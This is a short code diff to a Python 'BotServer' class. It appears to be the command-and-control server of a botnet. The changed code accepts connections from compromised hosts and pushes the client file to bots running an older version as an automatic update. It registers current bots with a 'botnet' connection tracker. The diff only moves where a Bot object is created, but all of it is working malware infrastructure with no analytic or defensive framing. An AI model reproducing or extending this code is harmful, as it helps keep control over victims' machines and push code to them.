@@ -34,13 +34,12 @@ class BotServer(Thread):
 
             user = host_info['user'].strip()
             botversion = LooseVersion(host_info['version'])
-            bot = Bot(clientsock, host_info, self.socketio)
 
             if botversion < self.clientversion:
                 # Autoupdate
                 print("[*] Updating {} on version {}".format(user, botversion))
+                bot = Bot(clientsock, host_info, self.socketio)
                 bot.sendClientFile(open(os.path.abspath(client.__file__), 'rb'))
             else:
                 print("[+] Received connection from {}".format(user))
-                self.botnet.addConnection(user, bot)
-                self.socketio.emit('connection', {'user': user}, namespace='/bot')
+                self.botnet.addConnection(user, clientsock, host_info, self.socketio)
